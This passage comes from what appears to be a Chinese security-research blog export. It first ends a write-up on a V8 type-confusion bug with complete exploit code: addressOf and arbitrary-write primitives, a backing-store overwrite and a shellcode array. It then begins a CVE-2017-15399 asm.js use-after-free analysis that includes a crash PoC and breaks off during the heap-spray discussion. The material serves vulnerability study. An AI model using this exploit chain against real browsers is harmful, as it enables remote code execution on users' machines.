nop\n显然这里多了一个Map(FAST_HOLEY_ELEMENTS)的检查。既然加了patch和没加patch的生成的代码一样，为何后者能够有漏洞，这是因为虽然checkmap都移除了，但是checkmap仅能代表在这段JIT代码里可以做检查，调试发现，前者是无法执行到JIT的那个代码的，因为在执行JIT代码之前就已经做了检查（kPrototypeCheckGroup标记导致）。而后者能够执行到JIT代码。最终POC如下\nvar a;function Ctor() &#123;   a = new Date();&#125;function opt() &#123;   a.x = 0x123456;&#125;for (var i=0;i&lt;10000;i++) &#123;   Ctor();&#125;for (var i=0;i&lt;10000;i++) &#123;   opt();&#125;Ctor();opt();%DebugPrint(a);var str = new String(null);print(str);\n程序最终会崩溃\nDebugPrint: 0xf89de5a6539: [JSDate] - map = 0x3f13527042a9 [FastProperties] - prototype = 0x3fccf1f0c2d9 - elements = 0x1bcb0fe02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - value = 0xf89de5a6599 &lt;Number: 1.61563e+12&gt; - time = NaN - properties = &#123; &#125;Received signal 11 &lt;unknown&gt; 000000000000==== C stack trace =============================== [0x7f2ad9dc7a4e] [0x7f2ad9dc79a5] [0x7f2ad99cb8a0] [0x7f2ad8691b9c] [0x7f2ad869a1cd] [0x7f2ad869a8ae] [0x7f2ad86bb26c] [0x563cbf958f25] [0x563cbf958e45] [0x7f2ad86a244a] [0x7f2ad87cceef] [0x7f2ad87cb9d2] [0x7f2ad87cb52f] [0x2c31d0e043a7][end of stack trace]Segmentation fault (core dumped)\n虽然我们在opt函数里增加了一个属性，我们看到properties为空值，这意味着已发生了溢出。可以看到，0x123456越界写到了后面，破坏了某处数据，导致程序崩溃，该处实际上就是null Value对象。我们将最后的opt函数注释掉，然后重新调试。\nDebugPrint: 0x2609351265d9: [JSValue] - map = 0x15994da86981 [FastProperties] - prototype = 0x1a0972b178c1 - elements = 0x2adf5c602241 &lt;FixedArray[0]&gt; [FAST_STRING_WRAPPER_ELEMENTS] - value = 0x2adf5c602251 &lt;String[4]: null&gt; - properties = &#123;   #length: 0x2adf5c656379 &lt;AccessorInfo&gt; (accessor constant) &#125;\naddressOf原语构造该对象的value指针指向了0x2adf5c602251，而该处正是属性值越界写的地方，因此，我们可以控制整个null Value对象的数据，那么，我们只需要篡改length和content，就能完成地址泄露。文章开头介绍过有关属性存储的一些性质，那么，我们越界写，将content对应的位置属性赋值为对象地址，将length对应的位置的属性赋值为合适的整数，那么就可以再通过String(null)对象将content的内容读取出来，也就是实现了地址泄露，为了完成这个过程，我们还得保证不能损坏null Value对象的前2个字段的数据，也就是MAP和hash。由于hash仅在低4字节有数据，那么我们可以将这个位置对应的属性赋值为0，因为0属于SMI类型，被保存到hash字段的高4字节处不影响其值；接下来是如何绕过MAP的值，我们可以考虑在对应字段赋值为一个double值，这样，该处数据不会被覆盖，double写入相当于是mov [val+0x7] = double_val该处是一个MAP对象内部，这个位置的数据正好是一个不变的量，因此，我们只需要原模原样的赋值回去就可以了。\npwndbg&gt; x /2gx 0x0000335b22d82361+0x70x335b22d82368:\t0x0019000400007300\t0x00000000082003ff\n于是可以构造出addressOf原语\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true) + dv.getUint32(4,true)*0x100000000;&#125;var set;function opt_set() &#123;   set = new Set();&#125;function fakeNullStrValue(obj) &#123;   set.x0 = p64f(0x00007300,0x00190004); //skip map   set.x1 = 0; //hash   set.x2 = 0x8; //length   set.x3 = obj; //content&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_set();&#125;for (var i=0;i&lt;10000;i++) &#123;   fakeNullStrValue(&#123;&#125;);&#125;var str = new String(null);function addressOf(obj) &#123;   opt_set();   fakeNullStrValue(obj);   var addr = 0;   for (var i=0;i&lt;0x8;i++) &#123;      addr += (str.charCodeAt(i) * Math.pow(0x100,i));   &#125;   return addr - 0x1;&#125;print(&quot;str_addr=&quot; + addressOf(str).toString(16));\n\narb_write原语构造如何利用这个属性值越界溢出构造任意写原语呢？首先，我没有找到方法如何让一个Array对象临接于properties的位置之后，不然我们可以很容易通过修改Array对象的length属性来构造一个oob数组。所以我们可以考虑再借助另外两个不同的对象，这样有三个对象，由于最开始他们的properties都为空值，因此，他们的properties地址会一样，那么，首先利用第一个对象的属性溢出，伪造content = null_value_self_addr+0x1，那么接下来用第二个对象的属性溢出，往content位置赋值一个地址addr-0x7的double数据，那么这个地址值addr-0x7会被写入到null_value_self_addr+0x8处，对应的也就是null value对象的hash字段，利用最后一个对象的属性溢出，往hash字段赋值为值val的double数据，那么val就会被写入到addr处，构造出了任意地址写的原语。\nvar set;function opt_set() &#123;   set = new Set();&#125;function fakeNullStrValue(obj) &#123;   set.x0 = p64f(0x00007300,0x00190004); //skip map   set.x1 = 0; //hash   set.x2 = 0x8; //length   set.x3 = obj; //content&#125;var map;function opt_map() &#123;   map = new Map();&#125;function writeNullStrValuePtrContent(val) &#123;   map.x0 = p64f(0x00007300,0x00190004); //skip map   map.x1 = 0; //hash   map.x2 = 0x8; //length   map.x3 = val //content&#125;var date;function opt_date() &#123;   date = new Date();&#125;function writeBackingStorePtr(val) &#123;   date.x0 = p64f(0x00007300,0x00190004); //skip map   date.x1 = val; //hash&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_set();&#125;for (var i=0;i&lt;10000;i++) &#123;   fakeNullStrValue(&#123;&#125;);&#125;var str = new String(null);for (var i=0;i&lt;10000;i++) &#123;   opt_map();&#125;for (var i=0;i&lt;10000;i++) &#123;   writeNullStrValuePtrContent(i+1.1);&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_date();&#125;for (var i=0;i&lt;10000;i++) &#123;   writeBackingStorePtr(i+1.1);&#125;function arb_write(addr,value) &#123;   opt_set();   fakeNullStrValue(String(null));   //%DebugPrint(set);   //%SystemBreak();   opt_map();   writeNullStrValuePtrContent(p64f(addr &amp; 0xFFFFFFFF,addr / 0x100000000));   //%DebugPrint(map);   //%SystemBreak();   opt_date();   //%DebugPrint(date);   writeBackingStorePtr(p64f(value &amp; 0xFFFFFFFF,value / 0x100000000));   //%SystemBreak();&#125;\n其中，String(null)与new String(null)不同之处在于String(null)直接得到了那个null value对象，因此在写入时，content就直接是null value对象本身的地址。\nexp当构造出以上两个原语以后，就能够轻松写出exp了\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true) + dv.getUint32(4,true)*0x100000000;&#125;var set;function opt_set() &#123;   set = new Set();&#125;function fakeNullStrValue(obj) &#123;   set.x0 = p64f(0x00007300,0x00190004); //skip map   set.x1 = 0; //hash   set.x2 = 0x8; //length   set.x3 = obj; //content&#125;var map;function opt_map() &#123;   map = new Map();&#125;function writeNullStrValuePtrContent(val) &#123;   map.x0 = p64f(0x00007300,0x00190004); //skip map   map.x1 = 0; //hash   map.x2 = 0x8; //length   map.x3 = val //content&#125;var date;function opt_date() &#123;   date = new Date();&#125;function writeBackingStorePtr(val) &#123;   date.x0 = p64f(0x00007300,0x00190004); //skip map   date.x1 = val; //hash&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_set();&#125;for (var i=0;i&lt;10000;i++) &#123;   fakeNullStrValue(&#123;&#125;);&#125;var str = new String(null);function addressOf(obj) &#123;   opt_set();   fakeNullStrValue(obj);   var addr = 0;   for (var i=0;i&lt;0x8;i++) &#123;      addr += (str.charCodeAt(i) * Math.pow(0x100,i));   &#125;   return addr - 0x1;&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_map();&#125;for (var i=0;i&lt;10000;i++) &#123;   writeNullStrValuePtrContent(i+1.1);&#125;for (var i=0;i&lt;10000;i++) &#123;   opt_date();&#125;for (var i=0;i&lt;10000;i++) &#123;   writeBackingStorePtr(i+1.1);&#125;var arr_buf = new ArrayBuffer(0x100);var func = new Function(&quot;var a = 0x66666666;&quot;);var shellcode_ptr_addr = addressOf(func) + 0x38;print(&quot;shellcode_ptr_addr=&quot;+shellcode_ptr_addr.toString(16));var arr_buf_addr = addressOf(arr_buf);var backing_store_ptr_addr = arr_buf_addr + 0x20;print(&quot;backing_store_ptr_addr=&quot; + backing_store_ptr_addr.toString(16));var str_addr = addressOf(str);print(&quot;str_addr=&quot; + str_addr.toString(16));function arb_write(addr,value) &#123;   opt_set();   fakeNullStrValue(String(null));   //%DebugPrint(set);   //%SystemBreak();   opt_map();   writeNullStrValuePtrContent(p64f(addr &amp; 0xFFFFFFFF,addr / 0x100000000));   //%DebugPrint(map);   //%SystemBreak();   opt_date();   //%DebugPrint(date);   writeBackingStorePtr(p64f(value &amp; 0xFFFFFFFF,value / 0x100000000));   //%SystemBreak();&#125;arb_write(backing_store_ptr_addr - 0x7,shellcode_ptr_addr);var arb_dv = new DataView(arr_buf);var shellcode_addr = u64f(arb_dv.getFloat64(0,true));print(&quot;shellcode_addr=&quot; + shellcode_addr.toString(16));arb_write(backing_store_ptr_addr - 0x7,shellcode_addr);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   arb_dv.setUint32(i*4,shellcode[i],true);&#125;%DebugPrint(str);%SystemBreak();//执行shellcode//func();\n\n0x03 感想本漏洞复现中学到了有关String的知识，并且利用了指针的指针的概念。感觉收获很多。\n0x04 参考谷歌中的V8引擎：Ignition和TurboFanCVE-2016-5168漏洞分析v8 exploit\n","categories":["CTF","安全研究","CVE"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"CVE-2017-15399","url":"/2021/04/07/CVE-2017-15399/","content":"文章首发于安全KER https://www.anquanke.com/post/id/235504\n0x00 前言之前一直在学习V8方面的漏洞，对于asm.js层的UAF漏洞还是第一次接触，本文将详细分析Chrome Issue 776677漏洞以及其利用方法。\n0x01 前置知识asm.js\nasm.js不是一门新的语言，而是JavaScript的一个子集。由Mozilla于2013年提出，主要为了提升JS引擎执行代码的速度。通俗来说，同样是js代码，符合asm.js规范的代码对JS引擎更加友好，JS引擎在解释执行这些代码更加省心（例如不用进行变量类型推断了），也就更加快。一旦 JavaScript 引擎发现运行的是 asm.js，就知道这是经过优化的代码，可以跳过语法分析这一步，直接转成汇编语言。另外，浏览器还会调用 WebGL 通过 GPU 执行 asm.js，即 asm.js 的执行引擎与普通的 JavaScript 脚本不同。这些都是 asm.js 运行较快的原因。据称，asm.js 在浏览器里的运行速度，大约是原生代码的50%左右。\n\n在asm.js 中，变量只有两种数据类型。32位带符号整数和64位带符号浮点数asm.js 的类型声明有固定写法，变量 | 0表示整数，+变量表示浮点数。如下\nvar a = 1;var x = a | 0;  // x 是32位整数var y = +a;  // y 是64位浮点数\n在javascript中，区别是普通js还是asm.js的关键在于函数里是否使用&quot;use asm&quot;;关键词修饰，在函数中，在&quot;use asm&quot;;关键词之后的代码都属于asm.js，如下，由于module第一行使用了该关键字，那么函数后面的代码都将使用asm.js将代码翻译为汇编代码\nfunction module() &#123;  &quot;use asm&quot;;   function f(x) &#123;      x = x | 0;   &#125;   return f;&#125;var f = module();f(1);\n使用./d8 t.js -print-opt-code运行，可以看到，虽然没有多次循环触发JIT编译，但是仍然使用了turbofan进行编译\nkind = JS_TO_WASM_FUNCTIONname = js-to-wasm#0compiler = turbofanInstructions (size = 138)0x3f4062c0     0  55             push ebp0x3f4062c1     1  89e5           mov ebp,esp0x3f4062c3     3  56             push esi0x3f4062c4     4  57             push edi0x3f4062c5     5  8b4508         mov eax,[ebp+0x8]0x3f4062c8     8  e8d303f01f     call 0x5f3066a0  (ToNumber)    ;; code: BUILTIN0x3f4062cd     d  a801           test al,0x10x3f4062cf     f  0f8528000000   jnz 0x3f4062fd  &lt;+0x3d&gt;0x3f4062d5    15  d1f8           sar eax,10x3f4062d7    17  f20f2ac8       cvtsi2sd xmm1,eax0x3f4062db    1b  f20f2cc1       cvttsd2si eax,xmm10x3f4062df    1f  83f801         cmp eax,0x10x3f4062e2    22  0f8039000000   jo 0x3f406321  &lt;+0x61&gt;0x3f4062e8    28  be00000000     mov esi,(nil)               ;; wasm context reference0x3f4062ed    2d  e8cefeffff     call 0x3f4061c0             ;; code: BUILTIN0x3f4062f2    32  b885411839     mov eax,0x39184185          ;; object: 0x39184185 &lt;undefined&gt;0x3f4062f7    37  89ec           mov esp,ebp0x3f4062f9    39  5d             pop ebp0x3f4062fa    3a  c20800         ret 0x80x3f4062fd    3d  b985411839     mov ecx,0x39184185          ;; object: 0x39184185 &lt;undefined&gt;0x3f406302    42  3bc1           cmp eax,ecx0x3f406304    44  0f8407000000   jz 0x3f406311  &lt;+0x51&gt;0x3f40630a    4a  f20f104803     movsd xmm1,[eax+0x3]0x3f40630f    4f  ebca           jmp 0x3f4062db  &lt;+0x1b&gt;0x3f406311    51  660f76c9       pcmpeqd xmm1,xmm10x3f406315    55  660f73f134     psllq xmm1,520x3f40631a    5a  660f73d101     psrlq xmm1,10x3f40631f    5f  ebba           jmp 0x3f4062db  &lt;+0x1b&gt;0x3f406321    61  83ec08         sub esp,0x80x3f406324    64  f20f110c24     movsd [esp],xmm10x3f406329    69  e8d25ac0fc     call 0x3c00be00             ;; code: STUB, DoubleToIStub, minor: 00x3f40632e    6e  83c408         add esp,0x80x3f406331    71  ebb5           jmp 0x3f4062e8  &lt;+0x28&gt;0x3f406333    73  90             nop\n在asm.js中，不能直接调用javascript中的函数或者访问数据，如下会报错，找不到print函数\nfunction module() &#123;  &quot;use asm&quot;;   function f(x) &#123;      x = x | 0;      print(x);   &#125;   return f;&#125;\n想要在asm.js中调用js中的函数和对象，必须使用函数参数来间接传递地址进行访问，如下\nfunction module(stdlib) &#123;  &quot;use asm&quot;;   var p = stdlib.print;   function f(x) &#123;      x = x | 0;      p(x);   &#125;   return f;&#125;var stdlib = &#123;print:print&#125;;var f = module(stdlib);f(1);\n通常，一个标准的asm.js函数模块参数应该有三个function module(stdlib,foreign,buffer) &#123;&#125;，其中stdlib用来传递想要用到的一些函数，foreign用来传递一些变量,buffer用来共享内存。\nfunction module(stdlib,foreign,buffer) &#123;  &quot;use asm&quot;;  var fl = new stdlib.Uint32Array(buffer);  function f1(x) &#123;    x = x | 0;    fl[0x11]  = x;  &#125;  return f1;&#125;var global = &#123;Uint32Array:Uint32Array&#125;;var env = &#123;&#125;;var buffer = new ArrayBuffer(0x100);var f = module(global,env,buffer);f(0x22);var dv = new DataView(buffer);print(dv.getUint32(0x11*4,true));\n如图，我们在asm.js里修改了ArrayBuffer的内容，然后在js层显示。除了直接传入ArrayBuffer对象进行内存共享，还可以使用WebAssembly.Memory来构造\nvar memory = new WebAssembly.Memory(&#123;initial:200&#125;);var buffer = memory.buffer;\n其返回的buffer也是一个ArrayBuffer对象\nDebugPrint: 0x4cb18421: [JSArrayBuffer] in OldSpace - map = 0x3b9047b9 [FastProperties] - prototype = 0x4cb08ac5 - elements = 0x5450412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS] - embedder fields: 2 - backing_store = 0xf1dca000 - byte_length = 13107200 - wasm_buffer - properties = 0x5450412d &lt;FixedArray[0]&gt; &#123;&#125; - embedder fields = &#123;    (nil)    (nil) &#125;\n其中initial:200代表申请200页大小的内存，每页为0x10000。使用WebAssembly.Memory的好处是其申请的内存空间可以扩展，如果想要扩充空间，·只需调用grow函数。而ArrayBuffer的话不能做到空间扩充。\nmemory.grow(1); //扩充1页的内存\n0x02 漏洞分析patch分析patch的地方比较多，经过分析，比较关键的地方是这两处\nindex cecf460..24b9091 100644--- a/src/asmjs/asm-js.cc+++ b/src/asmjs/asm-js.cc@@ -374,6 +374,7 @@       ReportInstantiationFailure(script, position, &quot;Requires heap buffer&quot;);       return MaybeHandle&lt;Object&gt;();     &#125;+    memory-&gt;set_is_growable(false);     size_t size = NumberToSize(memory-&gt;byte_length());     // TODO(mstarzinger): We currently only limit byte length of the buffer to     // be a multiple of 8, we should enforce the stricter spec limits here.\ndiff --git a/src/wasm/wasm-js.cc b/src/wasm/wasm-js.ccindex bad1a21..631d94a 100644--- a/src/wasm/wasm-js.cc+++ b/src/wasm/wasm-js.cc@@ -753,6 +753,10 @@     max_size64 = i::FLAG_wasm_max_mem_pages;   &#125;   i::Handle&lt;i::JSArrayBuffer&gt; old_buffer(receiver-&gt;array_buffer());+  if (!old_buffer-&gt;is_growable()) &#123;+    thrower.RangeError(&quot;This memory cannot be grown&quot;);+    return;+  &#125;   uint32_t old_size =       old_buffer-&gt;byte_length()-&gt;Number() / i::wasm::kSpecMaxWasmMemoryPages;   int64_t new_size64 = old_size + delta_size;\n主要是为asm.js的memory设置了一个标记，不允许我们在memory传给asm.js的模块以后再调用memory.grow()函数。其精简后的POC如下\nfunction module(stdlib,foreign,buffer) &#123;  &quot;use asm&quot;;  var fl = new stdlib.Uint32Array(buffer);  function f1(x) &#123;    x = x | 0;    fl[0] = x;  &#125;  return f1;&#125;var global = &#123;Uint32Array:Uint32Array&#125;;var env = &#123;&#125;;var memory = new WebAssembly.Memory(&#123;initial:200&#125;);var buffer = memory.buffer;var evil_f = module(global,env,buffer);memory.grow(1);evil_f(1);\n与前面的示例差不多，我们仅仅是增加了一句memory.grow(1);，然后调用函数以后就出现了崩溃。\nroot@ubuntu:~/Desktop/v8/out.gn/ia32.debug# ./d8 poc.jsReceived signal 11 SEGV_MAPERR 0000f1d64000==== C stack trace =============================== [0x0000f58e4e80] [0x0000f58e4d7a] [0x0000f7f07b80] [0x00004010658b] [0x0000549fc522] [0x0000549f9336] [0x00005498608f] [0x0000f6d7935f] [0x0000f6d788a2] [0x0000f6d786af] [0x0000f61fbef6] [0x0000565f7010] [0x00005660c8c0] [0x000056610ff3] [0x000056612523] [0x000056612912] [0x0000f53ace91][end of stack trace]Segmentation fault (core dumped)\n很明显是内存访问错误，使用gdb调试\npwndbg&gt; cContinuing.Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.0x4498658b in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────*EAX  0x1*EBX  0x0*ECX  0xc80000*EDX  0xf1d99000*EDI  0x44986580 ◂— mov    ecx, dword ptr [esi + 4] /* 0x8b044e8b */*ESI  0x56d586d0 ◂— 0xf1d99000*EBP  0xfff53ed4 —▸ 0xfff53f08 —▸ 0xfff53f20 —▸ 0xfff53f48 —▸ 0xfff540d8 ◂— ...*ESP  0xfff53ec8 —▸ 0x449862f2 ◂— mov    eax, 0x43a84185 /* 0xa84185b8 */*EIP  0x4498658b ◂— mov    dword ptr [edx + ebx], eax /* 0xc31a0489 */───────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────── ► 0x4498658b    mov    dword ptr [edx + ebx], eax   0x4498658e    ret \n查看该地址0xf1d99000的映射情况，可以发现这个地址不在映射之内\n.............0xf1109000 0xf1d99000 rw-p   c90000 0      0xf2a19000 0xf2c8e000 rw-p   275000 0      .............\n然而如果事先加了一个%DebugPrint将buffer打印的话，会发现\nDebugPrint: 0x52698935: [JSArrayBuffer] in OldSpace - map = 0x5ab047b9 [FastProperties] - prototype = 0x52688ac5 - elements = 0x3628412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS] - embedder fields: 2 - backing_store = 0xf1d99000 - byte_length = 13107200 - wasm_buffer - properties = 0x3628412d &lt;FixedArray[0]&gt; &#123;&#125; - embedder fields = &#123;    (nil)    (nil) &#125;\n该不可访问地址实际就是ArrayBuffer的backing_store，那么可能的原因是memory.grow(1);操作使得ArrayBuffer的backing_store被释放掉了。我们在memory.grow(1);之后加一句%DebugPrint(buffer);，可以发现\nDebugPrint: 0x5c518941: [JSArrayBuffer] in OldSpace - map = 0x2a0847b9 [FastProperties] - prototype = 0x5c508ac5 - elements = 0x2de8412d &lt;FixedArray[0]&gt; [HOLEY_SMI_ELEMENTS] - embedder fields: 2 - backing_store = (nil) - byte_length = 0 - external - neuterable - neutered - wasm_buffer - properties = 0x2de8412d &lt;FixedArray[0]&gt; &#123;&#125; - embedder fields = &#123;    (nil)    (nil) &#125;\nArrayBuffer的一些指针确实被清空掉了，但是asm.js里访问时仍然使用了原来那个指针，这是一个UAF。\nasm.js的UAF成因分析在分析这个UAF之前，我们先大致了解一下asm.js的编译过程，一个比较关键的地方是位于src/wasm/module-compiler.cc文件中的InstanceBuilder::Build函数，第1792行开始，获取外部传入的ArrayBuffer对象，并设置一些属性\n  1792   if (!memory_.is_null()) &#123;  1793     Handle&lt;JSArrayBuffer&gt; memory = memory_.ToHandleChecked();  1794     // Set externally passed ArrayBuffer non neuterable.► 1795     memory-&gt;set_is_neuterable(false);  1796     memory-&gt;set_is_wasm_buffer(true);  1797   1798     DCHECK_IMPLIES(trap_handler::UseTrapHandler(),  1799                    module_-&gt;is_asm_js() || memory-&gt;has_guard_region());  1800   &#125; else if (initial_pages &gt; 0) &#123;\n然后第1838行开始，进行一些检查，然后将ArrayBuffer对象设置到instance实例中。\n  1838   Address mem_start = nullptr;  1839   uint32_t mem_size = 0;  1840   if (!memory_.is_null()) &#123;  1841     Handle&lt;JSArrayBuffer&gt; memory = memory_.ToHandleChecked();  1842     mem_start = static_cast&lt;Address&gt;(memory-&gt;backing_store());► 1843     CHECK(memory-&gt;byte_length()-&gt;ToUint32(&amp;mem_size));  1844     LoadDataSegments(mem_start, mem_size);  1845     // Just like with globals, we need to keep both the JSArrayBuffer  1846     // and save the start pointer.  1847     instance-&gt;set_memory_buffer(*memory);  1848   &#125;\n然后第1854行，使用WasmMemoryObject::New创建了一个memory_object，并将其设置到instance实例中\nIn file: /home/sea/Desktop/v8/src/wasm/module-compiler.cc   1853   if (module_-&gt;has_memory &amp;&amp; !instance-&gt;has_memory_object()) &#123;   1854     Handle&lt;WasmMemoryObject&gt; memory_object = WasmMemoryObject::New(   1855         isolate_,   1856         instance-&gt;has_memory_buffer() ? handle(instance-&gt;memory_buffer())   1857                                       : Handle&lt;JSArrayBuffer&gt;::null(), ► 1858         module_-&gt;maximum_pages != 0 ? module_-&gt;maximum_pages : -1);   1859     instance-&gt;set_memory_object(*memory_object);   1860   &#125;\n接下来为新创建的memory_object设置instance\n   1904    1905   //--------------------------------------------------------------------------   1906   // Add instance to Memory object   1907   //--------------------------------------------------------------------------   1908   if (instance-&gt;has_memory_object()) &#123; ► 1909     Handle&lt;WasmMemoryObject&gt; memory(instance-&gt;memory_object(), isolate_);   1910     WasmMemoryObject::AddInstance(isolate_, memory, instance);   1911   &#125;   1912 pwndbg&gt; p memory$10 = &#123;  &lt;v8::internal::HandleBase&gt; = &#123;    location_ = 0x5671d6ac  &#125;, &lt;No data fields&gt;&#125;pwndbg&gt; p *memory$11 = (v8::internal::WasmMemoryObject *) 0x5b498b29\n执行完后，该memory_object调用has_instances会返回true，说明已经为该memory_object设置好了实例\npwndbg&gt; p instance-&gt;memory_object()-&gt;has_instances()$13 = true\n在分析完asm.js模块的编译过程以后，我们再来看一下JS层的grow函数。该函数的实现位于src/wasm/wasm-js.cc文件中的WebAssemblyMemoryGrow函数。第745行EXTRACT_THIS(receiver, WasmMemoryObject);获取到了js层的var memory = new WebAssembly.Memory(&#123;initial:200&#125;);这个对象。显然，在这里也表示为一个·WasmMemoryObject\n  740   i::Isolate* i_isolate = reinterpret_cast&lt;i::Isolate*&gt;(isolate);  741   HandleScope scope(isolate);  742   i::wasm::ScheduledErrorThrower thrower(i_isolate,  743                                          &quot;WebAssembly.Memory.grow()&quot;);  744   Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext();► 745   EXTRACT_THIS(receiver, WasmMemoryObject);  746   747   int64_t delta_size = 0;  748   if (!args[0]-&gt;IntegerValue(context).To(&amp;delta_size)) return;  749   750   int64_t max_size64 = receiver-&gt;maximum_pages();\n然后这里获取到ArrayBuffer对象以及一些属性，并在旧的size基础上加上增量以后进行一些范围检查。\nIn file: /home/sea/Desktop/v8/src/wasm/wasm-js.cc   752       max_size64 &gt; static_cast&lt;int64_t&gt;(i::FLAG_wasm_max_mem_pages)) &#123;   753     max_size64 = i::FLAG_wasm_max_mem_pages;   754   &#125;   755   i::Handle&lt;i::JSArrayBuffer&gt; old_buffer(receiver-&gt;array_buffer());   756   uint32_t old_size = ► 757       old_buffer-&gt;byte_length()-&gt;Number() / i::wasm::kSpecMaxWasmMemoryPages;   758   int64_t new_size64 = old_size + delta_size;   759   if (delta_size &lt; 0 || max_size64 &lt; new_size64 || new_size64 &lt; old_size) &#123;   760     thrower.RangeError(new_size64 &lt; old_size ? &quot;trying to shrink memory&quot;   761                                              : &quot;maximum memory size exceeded&quot;);   762     return;\n接下来调用WasmMemoryObject::Grow对ArrayBuffer的backing_store进行扩容，我们跟进该函数。\n► 764   int32_t ret = i::WasmMemoryObject::Grow(i_isolate, receiver,  765                                           static_cast&lt;uint32_t&gt;(delta_size));  766   if (ret == -1) &#123;  767     thrower.RangeError(&quot;Unable to grow instance memory.&quot;);  768     return;  769   &#125;\n在WasmMemoryObject::Grow函数里，通过一些检查以后，就调用GrowMemoryBuffer来分配一块更大的内存了。\n  476   uint32_t maximum_pages = FLAG_wasm_max_mem_pages;  477   if (memory_object-&gt;has_maximum_pages()) &#123;  478     maximum_pages = Min(FLAG_wasm_max_mem_pages,  479                         static_cast&lt;uint32_t&gt;(memory_object-&gt;maximum_pages()));  480   &#125;► 481   new_buffer = GrowMemoryBuffer(isolate, old_buffer, pages, maximum_pages);  482   if (new_buffer.is_null()) return -1;\n接下来来到这里，漏洞关键点来了\n ► 484   if (memory_object-&gt;has_instances()) &#123;   485     Handle&lt;WeakFixedArray&gt; instances(memory_object-&gt;instances(), isolate);   486     for (int i = 0; i &lt; instances-&gt;Length(); i++) &#123;   487       Object* elem = instances-&gt;Get(i);   488       if (!elem-&gt;IsWasmInstanceObject()) continue;   489       Handle&lt;WasmInstanceObject&gt; instance(WasmInstanceObject::cast(elem),pwndbg&gt; p memory_object-&gt;has_instances()$17 = false\n因为这里的memory_object来自与JS层的那个memory对象，而不是在InstanceBuilder::Build函数中创建的那个，因此memory_object-&gt;has_instances()返回的是false。这意味着下面的代码不会执行\nif (memory_object-&gt;has_instances()) &#123;  Handle&lt;WeakFixedArray&gt; instances(memory_object-&gt;instances(), isolate);  for (int i = 0; i &lt; instances-&gt;Length(); i++) &#123;    Object* elem = instances-&gt;Get(i);    if (!elem-&gt;IsWasmInstanceObject()) continue;    Handle&lt;WasmInstanceObject&gt; instance(WasmInstanceObject::cast(elem),                                        isolate);    SetInstanceMemory(isolate, instance, new_buffer);  &#125;&#125;\n由于SetInstanceMemory(isolate, instance, new_buffer);没有执行，导致wasm的实例里保存的那个buffer仍然是最开始那个buffer的地址，没有将new_buffer更新进去。此时程序继续执行，更新JS层的memory对象\n  494   memory_object-&gt;set_array_buffer(*new_buffer);► 495   return old_size / WasmModule::kPageSize;\n接下来是对old_buffer进行处理\n  770   if (!old_buffer-&gt;is_shared()) &#123;  771     // When delta_size == 0, or guard pages are enabled, the same backing store  772     // is used. To be spec compliant, the buffer associated with the memory  773     // object needs to be detached. Setup a new buffer with the same backing  774     // store, detach the old buffer, and do not free backing store memory.► 775     bool free_memory = delta_size != 0 &amp;&amp; !old_buffer-&gt;has_guard_region();  776     if ((!free_memory &amp;&amp; old_size != 0) || new_size64 == 0) &#123;  777       i::WasmMemoryObject::SetupNewBufferWithSameBackingStore(  778           i_isolate, receiver, static_cast&lt;uint32_t&gt;(new_size64));  779     &#125;  780     i::wasm::DetachMemoryBuffer(i_isolate, old_buffer, free_memory);\n我们跟进DetachMemoryBuffer函数，这里将old_buffer的backing_store给释放掉了。\nIn file: /home/sea/Desktop/v8/src/wasm/wasm-memory.cc   120       // We need to free the memory before neutering the buffer because   121       // FreeBackingStore reads buffer-&gt;allocation_base(), which is nulled out   122       // by Neuter. This means there is a dangling pointer until we neuter the   123       // buffer. Since there is no way for the user to directly call   124       // FreeBackingStore, we can ensure this is safe. ► 125       buffer-&gt;FreeBackingStore();   126     &#125;   127   &#125;   128   buffer-&gt;set_is_neuterable(true);   129   buffer-&gt;Neuter();   130 &#125;\n可以看出，由于没有更新wasm实例里的ArrayBuffer对象，并且后面该ArrayBuffer被释放，由此导致了UAF的产生，原来backing_store的内存空间被unmmap掉了，使得其不再出现在映射表中。当我们再次访问这块内存时，便出现了段错误。\n0x03 漏洞利用概述现在，我们制造出了一个UAF，但是backing_store的内存与一般对象的内存地址是分开的，不能指望将其他对象占位与此。与backing_store类似的是Array的Element，它们都属于大容量存储，因此它们之间很可能会分配到相邻的地址或者地址相差较小的位置。因此，我们可以考虑使用Heap Spray技术，在backing_store地址附近都布局下Array的Element对象，然后通过UAF去控制。由于64位内存空间太大，Heap Spray似乎无法成功将Element对象放到backing_store地址附近，因此这个漏洞目前仅在32位下成功利用。\n何时进行 Heap Spray我们需要寻找一个合适的时机进行Heap Spray，在asm.js模块的汇编代码中，我们注意到如下代码\n0x255062c0     0  55             push ebp0x255062c1     1  89e5           mov ebp,esp0x255062c3     3  56             push esi0x255062c4     4  57             push edi0x255062c5     5  8b4508         mov 